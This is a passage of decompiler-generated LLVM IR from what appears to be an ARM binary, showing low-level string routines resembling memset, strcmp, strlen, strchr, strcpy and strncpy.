  store i8 %v1_11df0, i8* %v3_11df0, align 1
  %v4_11df0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11df0 = add i32 %v4_11df0, 1
  store i32 %v5_11df0, i32* %r3.global-to-local, align 4
  %v0_11df4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11df4 = trunc i32 %v0_11df4 to i8
  %v3_11df4 = inttoptr i32 %v5_11df0 to i8*
  store i8 %v1_11df4, i8* %v3_11df4, align 1
  %v4_11df4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11df4 = add i32 %v4_11df4, 1
  store i32 %v5_11df4, i32* %r3.global-to-local, align 4
  %v0_11df8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11df8 = trunc i32 %v0_11df8 to i8
  %v3_11df8 = inttoptr i32 %v5_11df4 to i8*
  store i8 %v1_11df8, i8* %v3_11df8, align 1
  %v4_11df8 = load i32, i32* %r3.global-to-local, align 4
  %v5_11df8 = add i32 %v4_11df8, 1
  store i32 %v5_11df8, i32* %r3.global-to-local, align 4
  %v0_11dfc = load i32, i32* %r1.global-to-local, align 4
  %v1_11dfc = trunc i32 %v0_11dfc to i8
  %v3_11dfc = inttoptr i32 %v5_11df8 to i8*
  store i8 %v1_11dfc, i8* %v3_11dfc, align 1
  %v4_11dfc = load i32, i32* %r3.global-to-local, align 4
  %v5_11dfc = add i32 %v4_11dfc, 1
  store i32 %v5_11dfc, i32* %r3.global-to-local, align 4
  %v0_11e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e00 = trunc i32 %v0_11e00 to i8
  %v3_11e00 = inttoptr i32 %v5_11dfc to i8*
  store i8 %v1_11e00, i8* %v3_11e00, align 1
  %v4_11e00 = load i32, i32* %r3.global-to-local, align 4
  %v5_11e00 = add i32 %v4_11e00, 1
  store i32 %v5_11e00, i32* %r3.global-to-local, align 4
  %v0_11e04 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e04 = trunc i32 %v0_11e04 to i8
  %v3_11e04 = inttoptr i32 %v5_11e00 to i8*
  store i8 %v1_11e04, i8* %v3_11e04, align 1
  %v4_11e04 = load i32, i32* %r3.global-to-local, align 4
  %v5_11e04 = add i32 %v4_11e04, 1
  store i32 %v5_11e04, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11da0, { 1, 0 }
  uselistorder i32 %v12_11dcc, { 1, 2, 0 }
  uselistorder i32 %v0_11da054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11d98.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11d88, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_11d7c, { 1, 0 }
  uselistorder i32 %v0_11d74, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 2, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11dd8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11db0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_11e10(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11e14.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11e10

dec_label_pc_11e10:                               ; preds = %bb3, %bb
  %v0_11e14 = phi i32 [ %v0_11e14.pre, %bb ], [ %v5_11e14, %bb3 ]
  %v0_11e10 = phi i32 [ %tmp, %bb ], [ %v5_11e10, %bb3 ]
  %v1_11e10 = inttoptr i32 %v0_11e10 to i8*
  %v2_11e10 = load i8, i8* %v1_11e10, align 1
  %v3_11e10 = zext i8 %v2_11e10 to i32
  store i32 %v3_11e10, i32* @r2, align 4
  %v1_11e14 = inttoptr i32 %v0_11e14 to i8*
  %v2_11e14 = load i8, i8* %v1_11e14, align 1
  %v3_11e14 = zext i8 %v2_11e14 to i32
  %v2_11e18 = icmp eq i8 %v2_11e10, 0
  br i1 %v2_11e18, label %.dec_label_pc_11e24_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_11e10
  %v5_11e14 = add i32 %v0_11e14, 1
  %v5_11e10 = add i32 %v0_11e10, 1
  %v10_11e1c = icmp eq i8 %v2_11e10, %v2_11e14
  br i1 %v10_11e1c, label %dec_label_pc_11e10, label %dec_label_pc_11e24

.dec_label_pc_11e24_crit_edge:                    ; preds = %dec_label_pc_11e10
  br label %dec_label_pc_11e24

dec_label_pc_11e24:                               ; preds = %bb3, %.dec_label_pc_11e24_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_11e24_crit_edge ], [ %v3_11e10, %bb3 ]
  %v2_11e24.pre-phi = sub nsw i32 %.pn, %v3_11e14
  ret i32 %v2_11e24.pre-phi

; uselistorder directives
  uselistorder i32 %v0_11e10, { 1, 0 }
  uselistorder i32 %v0_11e14, { 1, 0 }
  uselistorder label %dec_label_pc_11e24, { 1, 0 }
}

define i32 @function_11e30() local_unnamed_addr {
dec_label_pc_11e30:
  %v0_11e30 = load i32, i32* @r0, align 4
  %v1_11e30 = and i32 %v0_11e30, -4
  %v1_11e34 = inttoptr i32 %v1_11e30 to i32*
  %v2_11e34 = load i32, i32* %v1_11e34, align 4
  %v1_11e38 = urem i32 %v0_11e30, 4
  %v2_11e38 = icmp eq i32 %v1_11e38, 0
  %v1_11e3c = sub nsw i32 0, %v1_11e38
  br i1 %v2_11e38, label %.preheader.preheader, label %dec_label_pc_11e44

dec_label_pc_11e44:                               ; preds = %dec_label_pc_11e30
  %v1_11e44 = or i32 %v2_11e34, 255
  %v7_11e48 = icmp eq i32 %v1_11e38, 1
  br i1 %v7_11e48, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_11e44
  %v9_11e4c = or i32 %v2_11e34, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_11e44, %bb
  %v8_11e54 = phi i32 [ %v1_11e44, %dec_label_pc_11e44 ], [ %v9_11e4c, %bb ]
  %v7_11e54 = icmp eq i32 %v1_11e38, 3
  br i1 %v7_11e54, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_11e54 = or i32 %v8_11e54, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_11e30
  %v1_11e64.ph = phi i32 [ %v2_11e34, %dec_label_pc_11e30 ], [ %v9_11e54, %bb34 ], [ %v8_11e54, %bb33 ]
  %v1_11e5838 = urem i32 %v1_11e64.ph, 256
  %v2_11e5839 = icmp eq i32 %v1_11e5838, 0
  %v2_11e5c40 = and i32 %v1_11e64.ph, 65280
  %v3_11e5c41 = icmp eq i32 %v2_11e5c40, 0
  %or.cond42 = or i1 %v2_11e5839, %v3_11e5c41
  %v2_11e6043 = and i32 %v1_11e64.ph, 16711680
  %v3_11e6044 = icmp eq i32 %v2_11e6043, 0
  %or.cond3145 = or i1 %v3_11e6044, %or.cond42
  %v4_11e6446 = icmp ult i32 %v1_11e64.ph, 16777216
  %or.cond3247 = or i1 %v4_11e6446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_11e74, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_11e681349 = phi i32 [ %v2_11e6814, %.thread4 ], [ %v1_11e3c, %.preheader.preheader ]
  %v1_11e6c48.in = phi i32 [ %v1_11e6c48, %.thread4 ], [ %v1_11e30, %.preheader.preheader ]
  %v1_11e6c48 = add i32 %v1_11e6c48.in, 4
  %v2_11e6814 = add i32 %v1_11e681349, 4
  %v2_11e6c = inttoptr i32 %v1_11e6c48 to i32*
  %v3_11e6c = load i32, i32* %v2_11e6c, align 4
  %v1_11e58 = urem i32 %v3_11e6c, 256
  %v2_11e58 = icmp eq i32 %v1_11e58, 0
  %v2_11e5c = and i32 %v3_11e6c, 65280
  %v3_11e5c = icmp eq i32 %v2_11e5c, 0
  %or.cond = or i1 %v2_11e58, %v3_11e5c
  %v2_11e60 = and i32 %v3_11e6c, 16711680
  %v3_11e60 = icmp eq i32 %v2_11e60, 0
  %or.cond31 = or i1 %v3_11e60, %or.cond
  %v4_11e64 = icmp ult i32 %v3_11e6c, 16777216
  %or.cond32 = or i1 %v4_11e64, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_11e74, label %.thread4

dec_label_pc_11e74:                               ; preds = %.thread4, %.preheader.preheader
  %v1_11e6813.lcssa = phi i32 [ %v1_11e3c, %.preheader.preheader ], [ %v2_11e6814, %.thread4 ]
  %v2_11e58.lcssa = phi i1 [ %v2_11e5839, %.preheader.preheader ], [ %v2_11e58, %.thread4 ]
  %v3_11e5c.lcssa = phi i1 [ %v3_11e5c41, %.preheader.preheader ], [ %v3_11e5c, %.thread4 ]
  %v3_11e60.lcssa = phi i1 [ %v3_11e6044, %.preheader.preheader ], [ %v3_11e60, %.thread4 ]
  br i1 %v2_11e58.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_11e74
  %v2_11e78 = add i32 %v1_11e6813.lcssa, 1
  br i1 %v3_11e5c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_11e8017 = add i32 %v1_11e6813.lcssa, 2
  br i1 %v3_11e60.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_11e88 = add i32 %v1_11e6813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_11e74, %bb35, %bb36, %bb37
  %v1_11e8c = phi i32 [ %v2_11e78, %bb35 ], [ %v2_11e8017, %bb36 ], [ %v2_11e88, %bb37 ], [ %v1_11e6813.lcssa, %dec_label_pc_11e74 ]
  ret i32 %v1_11e8c

; uselistorder directives
  uselistorder i32 %v1_11e6813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_11e6c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_11e64.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_11e38, { 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_11e90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e90:
  %v6_11e90 = load i32, i32* @r5, align 4
  %v9_11e90 = load i32, i32* @r6, align 4
  %v1_11e94 = urem i32 %arg1, 256
  br label %dec_label_pc_11eb4

dec_label_pc_11e9c:                               ; preds = %dec_label_pc_11eb4
  %v3_11e9c = load i8, i8* %.0, align 1
  %v4_11e9c = zext i8 %v3_11e9c to i32
  %v9_11ea0 = icmp eq i32 %v4_11e9c, %v1_11e94
  br i1 %v9_11ea0, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_11e9c
  ret i32 %v1_11eb4

bb24:                                             ; preds = %dec_label_pc_11e9c
  %v2_11ea8 = icmp eq i8 %v3_11e9c, 0
  %v2_11eac = add i32 %v1_11eb4, 1
  %v3_11eac = inttoptr i32 %v2_11eac to i8*
  br i1 %v2_11ea8, label %dec_label_pc_11f88, label %dec_label_pc_11eb4

dec_label_pc_11eb4:                               ; preds = %bb24, %dec_label_pc_11e90
  %.0 = phi i8* [ undef, %dec_label_pc_11e90 ], [ %v3_11eac, %bb24 ]
  %v1_11eb4 = ptrtoint i8* %.0 to i32
  %v2_11eb4 = urem i32 %v1_11eb4, 4
  %v3_11eb4 = icmp eq i32 %v2_11eb4, 0
  br i1 %v3_11eb4, label %dec_label_pc_11ebc, label %dec_label_pc_11e9c

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11eb4
  %v4_11ebc = mul nuw nsw i32 %v1_11e94, 256
  %v5_11ebc = or i32 %v4_11ebc, %v1_11e94
  %v4_11ec4 = mul i32 %v5_11ebc, 65536
  %v5_11ec4 = or i32 %v4_11ec4, %v5_11ebc
  br label %dec_label_pc_11ec8

dec_label_pc_11ec8:                               ; preds = %dec_label_pc_11f80, %dec_label_pc_11f08, %dec_label_pc_11ebc
  %v0_11f2c = phi i32 [ %v1_11eb4, %dec_label_pc_11ebc ], [ %v4_11ec8, %dec_label_pc_11f08 ], [ %v4_11ec8, %dec_label_pc_11f80 ]
  %v1_11ec8 = inttoptr i32 %v0_11f2c to i32*
  %v2_11ec8 = load i32, i32* %v1_11ec8, align 4
  %v4_11ec8 = add i32 %v0_11f2c, 4
  %v2_11ed0 = xor i32 %v2_11ec8, %v5_11ec4
  %v2_11edc = add i32 %v2_11ec8, 2130640639
  %v1_11ee0 = sub i32 -1, %v2_11ec8
  %v2_11ee4 = xor i32 %v2_11edc, %v1_11ee0
  %v2_11ee8 = add i32 %v2_11ed0, 2130640639
  %v1_11ef0 = sub i32 -1, %v2_11ed0
  %v2_11ef4 = and i32 %v2_11ee4, -2130640640
  %v2_11ef8 = xor i32 %v2_11ee8, %v1_11ef0
  %v2_11efc = icmp eq i32 %v2_11ef4, 0
  %v2_11f00 = and i32 %v2_11ef8, -2130640640
  store i32 %v2_11f00, i32* @lr, align 4
  br i1 %v2_11efc, label %dec_label_pc_11f08, label %dec_label_pc_11f10

dec_label_pc_11f08:                               ; preds = %dec_label_pc_11ec8
  %v2_11f08 = icmp eq i32 %v2_11f00, 0
  br i1 %v2_11f08, label %dec_label_pc_11ec8, label %dec_label_pc_11f10

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11ec8, %dec_label_pc_11f08
  %v2_11f10 = inttoptr i32 %v0_11f2c to i8*
  %v3_11f10 = load i8, i8* %v2_11f10, align 1
  %v4_11f10 = zext i8 %v3_11f10 to i32
  %v1_11f18 = add i32 %v0_11f2c, 1
  %v1_11f1c = add i32 %v0_11f2c, 2
  %v9_11f20 = icmp eq i32 %v4_11f10, %v1_11e94
  %v1_11f24 = add i32 %v0_11f2c, 3
  store i32 %v1_11f24, i32* @ip, align 4
  br i1 %v9_11f20, label %dec_label_pc_11f2c, label %dec_label_pc_11f34

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11f10
  store i32 %v6_11e90, i32* @r5, align 4
  store i32 %v9_11e90, i32* @r6, align 4
  ret i32 %v0_11f2c

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11f10
  %v2_11f34 = icmp eq i8 %v3_11f10, 0
  br i1 %v2_11f34, label %dec_label_pc_11f88, label %dec_label_pc_11f3c

dec_label_pc_11f3c:                               ; preds = %dec_label_pc_11f34
  %v2_11f3c = inttoptr i32 %v1_11f18 to i8*
  %v3_11f3c = load i8, i8* %v2_11f3c, align 1
  %v4_11f3c = zext i8 %v3_11f3c to i32
  %v9_11f40 = icmp eq i32 %v4_11f3c, %v1_11e94
  br i1 %v9_11f40, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_11f3c
  store i32 %v6_11e90, i32* @r5, align 4
  store i32 %v9_11e90, i32* @r6, align 4
  ret i32 %v1_11f18

bb26:                                             ; preds = %dec_label_pc_11f3c
  %v2_11f48 = icmp eq i8 %v3_11f3c, 0
  br i1 %v2_11f48, label %dec_label_pc_11f88, label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %bb26
  %v2_11f50 = inttoptr i32 %v1_11f1c to i8*
  %v3_11f50 = load i8, i8* %v2_11f50, align 1
  %v4_11f50 = zext i8 %v3_11f50 to i32
  %v9_11f54 = icmp eq i32 %v4_11f50, %v1_11e94
  br i1 %v9_11f54, label %dec_label_pc_11f5c, label %dec_label_pc_11f64

dec_label_pc_11f5c:                               ; preds = %dec_label_pc_11f50
  store i32 %v6_11e90, i32* @r5, align 4
  store i32 %v9_11e90, i32* @r6, align 4
  ret i32 %v1_11f1c

dec_label_pc_11f64:                               ; preds = %dec_label_pc_11f50
  %v2_11f64 = icmp eq i8 %v3_11f50, 0
  br i1 %v2_11f64, label %dec_label_pc_11f88, label %dec_label_pc_11f6c

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f64
  %v2_11f6c = inttoptr i32 %v1_11f24 to i8*
  %v3_11f6c = load i8, i8* %v2_11f6c, align 1
  %v4_11f6c = zext i8 %v3_11f6c to i32
  %v9_11f70 = icmp eq i32 %v4_11f6c, %v1_11e94
  br i1 %v9_11f70, label %dec_label_pc_11f78, label %dec_label_pc_11f80

dec_label_pc_11f78:                               ; preds = %dec_label_pc_11f6c
  store i32 %v6_11e90, i32* @r5, align 4
  store i32 %v9_11e90, i32* @r6, align 4
  ret i32 %v1_11f24

dec_label_pc_11f80:                               ; preds = %dec_label_pc_11f6c
  %v2_11f80 = icmp eq i8 %v3_11f6c, 0
  br i1 %v2_11f80, label %dec_label_pc_11f88, label %dec_label_pc_11ec8

dec_label_pc_11f88:                               ; preds = %bb24, %dec_label_pc_11f80, %dec_label_pc_11f64, %bb26, %dec_label_pc_11f34
  store i32 %v6_11e90, i32* @r5, align 4
  store i32 %v9_11e90, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11ec8, { 1, 0 }
  uselistorder i32 %v2_11ec8, { 0, 2, 1 }
  uselistorder i32 %v0_11f2c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_11ebc, { 1, 0 }
  uselistorder i32 %v1_11eb4, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_11e94, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_11e90, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_11e90, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_11f88, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11f10, { 1, 0 }
}

define i32 @function_11f98(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_11f98:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_11f98 = sub i32 %arg1, %tmp
  %v1_11f9c = add i32 %v2_11f98, -1
  store i32 %v1_11f9c, i32* %r2.global-to-local, align 4
  %v2_11fa04 = load i8, i8* %arg2, align 1
  %v5_11fa06 = add i32 %tmp, 1
  store i32 %v5_11fa06, i32* %r1.global-to-local, align 4
  %v2_11fa47 = icmp eq i8 %v2_11fa04, 0
  store i1 %v2_11fa47, i1* %cpsr_z.global-to-local, align 1
  %v5_11fa88 = inttoptr i32 %arg1 to i8*
  store i8 %v2_11fa04, i8* %v5_11fa88, align 1
  %v0_11fac9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11fac9, label %dec_label_pc_11fb0, label %dec_label_pc_11fa0.dec_label_pc_11fa0_crit_edge

dec_label_pc_11fa0.dec_label_pc_11fa0_crit_edge:  ; preds = %dec_label_pc_11f98, %dec_label_pc_11fa0.dec_label_pc_11fa0_crit_edge
  %v0_11fa0.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_11fa8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11fa0 = inttoptr i32 %v0_11fa0.pre to i8*
  %v2_11fa0 = load i8, i8* %v1_11fa0, align 1
  %v5_11fa0 = add i32 %v0_11fa0.pre, 1
  store i32 %v5_11fa0, i32* %r1.global-to-local, align 4
  %v2_11fa4 = icmp eq i8 %v2_11fa0, 0
  store i1 %v2_11fa4, i1* %cpsr_z.global-to-local, align 1
  %v4_11fa8 = add i32 %v5_11fa0, %v3_11fa8.pre
  %v5_11fa8 = inttoptr i32 %v4_11fa8 to i8*
  store i8 %v2_11fa0, i8* %v5_11fa8, align 1
  %v0_11fac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11fac, label %dec_label_pc_11fb0, label %dec_label_pc_11fa0.dec_label_pc_11fa0_crit_edge

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11fa0.dec_label_pc_11fa0_crit_edge, %dec_label_pc_11f98
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11fa0.dec_label_pc_11fa0_crit_edge, { 1, 0 }
}

define i32 @function_11fb4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11fb4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_11fb4 = icmp eq i32 %arg2, 3
  store i1 %v7_11fb4, i1* %cpsr_z.global-to-local, align 1
  %v1_11fbc = add i32 %arg1, -1
  store i32 %v1_11fbc, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_12038, label %dec_label_pc_11fc4

dec_label_pc_11fc4:                               ; preds = %dec_label_pc_11fb4
  %v3_11fc4 = udiv i32 %arg2, 4
  store i32 %v3_11fc4, i32* @lr, align 4
  %v0_11fc8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %dec_label_pc_12014, %dec_label_pc_11fc4
  %v2_11fd0 = phi i32 [ %v6_12008, %dec_label_pc_12014 ], [ %v1_11fbc, %dec_label_pc_11fc4 ]
  %v0_11fc8 = phi i32 [ %v1_12018, %dec_label_pc_12014 ], [ %v0_11fc8.pre, %dec_label_pc_11fc4 ]
  %v1_11fc8 = inttoptr i32 %v0_11fc8 to i8*
  %v2_11fc8 = load i8, i8* %v1_11fc8, align 1
  %v3_11fc8 = zext i8 %v2_11fc8 to i32
  store i32 %v3_11fc8, i32* %r3.global-to-local, align 4
  %v2_11fcc = icmp eq i8 %v2_11fc8, 0
  store i1 %v2_11fcc, i1* %cpsr_z.global-to-local, align 1
  %v3_11fd0 = add i32 %v2_11fd0, 1
  %v4_11fd0 = inttoptr i32 %v3_11fd0 to i8*
  store i8 %v2_11fc8, i8* %v4_11fd0, align 1
  %v5_11fd0 = load i32, i32* %ip.global-to-local, align 4
  %v6_11fd0 = add i32 %v5_11fd0, 1
  store i32 %v6_11fd0, i32* %ip.global-to-local, align 4
  %v0_11fd4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11fd4, label %dec_label_pc_12024, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fc8
  %v0_11fd8 = load i32, i32* @r1, align 4
  %v1_11fd8 = add i32 %v0_11fd8, 1
  %v2_11fd8 = inttoptr i32 %v1_11fd8 to i8*
  %v3_11fd8 = load i8, i8* %v2_11fd8, align 1
  %v4_11fd8 = zext i8 %v3_11fd8 to i32
  store i32 %v4_11fd8, i32* %r3.global-to-local, align 4
  %v2_11fdc = icmp eq i8 %v3_11fd8, 0
  store i1 %v2_11fdc, i1* %cpsr_z.global-to-local, align 1
  %v3_11fe0 = add i32 %v5_11fd0, 2
  %v4_11fe0 = inttoptr i32 %v3_11fe0 to i8*
  store i8 %v3_11fd8, i8* %v4_11fe0, align 1
  %v5_11fe0 = load i32, i32* %ip.global-to-local, align 4
  %v6_11fe0 = add i32 %v5_11fe0, 1
  store i32 %v6_11fe0, i32* %ip.global-to-local, align 4
  %v0_11fe4 = load i32, i32* @r1, align 4
  %v1_11fe4 = add i32 %v0_11fe4, 1
  store i32 %v1_11fe4, i32* %r1.global-to-local, align 4
  %v0_11fe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11fe8, label %dec_label_pc_12024, label %dec_label_pc_11fec

dec_label_pc_11fec:                               ; preds = %dec_label_pc_11fd8
  %v1_11fec = add i32 %v0_11fe4, 2
  %v2_11fec = inttoptr i32 %v1_11fec to i8*
  %v3_11fec = load i8, i8* %v2_11fec, align 1
  %v4_11fec = zext i8 %v3_11fec to i32
  store i32 %v4_11fec, i32* %r3.global-to-local, align 4
  %v2_11ff0 = icmp eq i8 %v3_11fec, 0
  store i1 %v2_11ff0, i1* %cpsr_z.global-to-local, align 1
  %v3_11ff4 = add i32 %v5_11fe0, 2
  %v4_11ff4 = inttoptr i32 %v3_11ff4 to i8*
  store i8 %v3_11fec, i8* %v4_11ff4, align 1
  %v5_11ff4 = load i32, i32* %ip.global-to-local, align 4
  %v6_11ff4 = add i32 %v5_11ff4, 1
  store i32 %v6_11ff4, i32* %ip.global-to-local, align 4
  %v0_11ff8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ff8 = add i32 %v0_11ff8, 1
  store i32 %v1_11ff8, i32* %r1.global-to-local, align 4
  %v0_11ffc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11ffc, label %dec_label_pc_12024, label %dec_label_pc_12000

dec_label_pc_12000:                               ; preds = %dec_label_pc_11fec
  %v1_12000 = add i32 %v0_11ff8, 2
  %v2_12000 = inttoptr i32 %v1_12000 to i8*
  %v3_12000 = load i8, i8* %v2_12000, align 1
  %v4_12000 = zext i8 %v3_12000 to i32
  store i32 %v4_12000, i32* %r3.global-to-local, align 4
  %v2_12004 = icmp eq i8 %v3_12000, 0
  store i1 %v2_12004, i1* %cpsr_z.global-to-local, align 1
  %v3_12008 = add i32 %v5_11ff4, 2
  %v4_12008 = inttoptr i32 %v3_12008 to i8*
  store i8 %v3_12000, i8* %v4_12008, align 1
  %v5_12008 = load i32, i32* %ip.global-to-local, align 4
  %v6_12008 = add i32 %v5_12008, 1
  store i32 %v6_12008, i32* %ip.global-to-local, align 4
  %v0_1200c = load i32, i32* %r1.global-to-local, align 4
  %v1_1200c = add i32 %v0_1200c, 1
  store i32 %v1_1200c, i32* %r1.global-to-local, align 4
  %v0_12010 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12010, label %dec_label_pc_12024, label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %dec_label_pc_12000
  %v0_12014 = load i32, i32* @lr, align 4
  %v1_12014 = add i32 %v0_12014, -1
  store i32 %v1_12014, i32* @lr, align 4
  %v7_12014 = icmp eq i32 %v0_12014, 1
  store i1 %v7_12014, i1* %cpsr_z.global-to-local, align 1
  %v1_12018 = add i32 %v0_1200c, 2
  store i32 %v1_12018, i32* @r1, align 4
  br i1 %v7_12014, label %dec_label_pc_12038, label %dec_label_pc_11fc8

dec_label_pc_12024:                               ; preds = %dec_label_pc_12000, %dec_label_pc_11fec, %dec_label_pc_11fd8, %dec_label_pc_11fc8
  %v1_12024 = phi i32 [ %v6_12008, %dec_label_pc_12000 ], [ %v6_11ff4, %dec_label_pc_11fec ], [ %v6_11fe0, %dec_label_pc_11fd8 ], [ %v6_11fd0, %dec_label_pc_11fc8 ]
  %v2_120241 = sub i32 %arg1, %v1_12024
  %v2_12028 = add i32 %v2_120241, %arg2
  store i32 %v2_12028, i32* %r3.global-to-local, align 4
  %v1_1202c = add i32 %v2_12028, -1
  store i32 %v1_1202c, i32* %r2.global-to-local, align 4
  %v7_1202c = icmp eq i32 %v2_12028, 1
  store i1 %v7_1202c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1202c, label %bb, label %dec_label_pc_12058

bb:                                               ; preds = %dec_label_pc_12024
  ret i32 %arg1

dec_label_pc_12038:                               ; preds = %dec_label_pc_12014, %dec_label_pc_11fb4
  %v2_120486 = phi i32 [ %v1_11fbc, %dec_label_pc_11fb4 ], [ %v6_12008, %dec_label_pc_12014 ]
  %v1_12038 = urem i32 %arg2, 4
  store i32 %v1_12038, i32* %r2.global-to-local, align 4
  %v2_12038 = icmp eq i32 %v1_12038, 0
  store i1 %v2_12038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12038, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_12038
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_12038, %._crit_edge
  %v2_12048 = phi i32 [ %v6_12048, %._crit_edge ], [ %v2_120486, %dec_label_pc_12038 ]
  %v0_12044 = phi i32 [ %v0_12044.pre, %._crit_edge ], [ %v1_12038, %dec_label_pc_12038 ]
  %v0_12040 = load i32, i32* @r1, align 4
  %v1_12040 = inttoptr i32 %v0_12040 to i8*
  %v2_12040 = load i8, i8* %v1_12040, align 1
  %v3_12040 = zext i8 %v2_12040 to i32
  store i32 %v3_12040, i32* %r3.global-to-local, align 4
  %v5_12040 = add i32 %v0_12040, 1
  store i32 %v5_12040, i32* @r1, align 4
  %v1_12044 = add i32 %v0_12044, -1
  store i32 %v1_12044, i32* %r2.global-to-local, align 4
  %v7_12044 = icmp eq i32 %v0_12044, 1
  store i1 %v7_12044, i1* %cpsr_z.global-to-local, align 1
  %v3_12048 = add i32 %v2_12048, 1
  %v4_12048 = inttoptr i32 %v3_12048 to i8*
  store i8 %v2_12040, i8* %v4_12048, align 1
  %v5_12048 = load i32, i32* %ip.global-to-local, align 4
  %v6_12048 = add i32 %v5_12048, 1
  store i32 %v6_12048, i32* %ip.global-to-local, align 4
  %v0_1204c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1204c, label %bb12, label %bb13

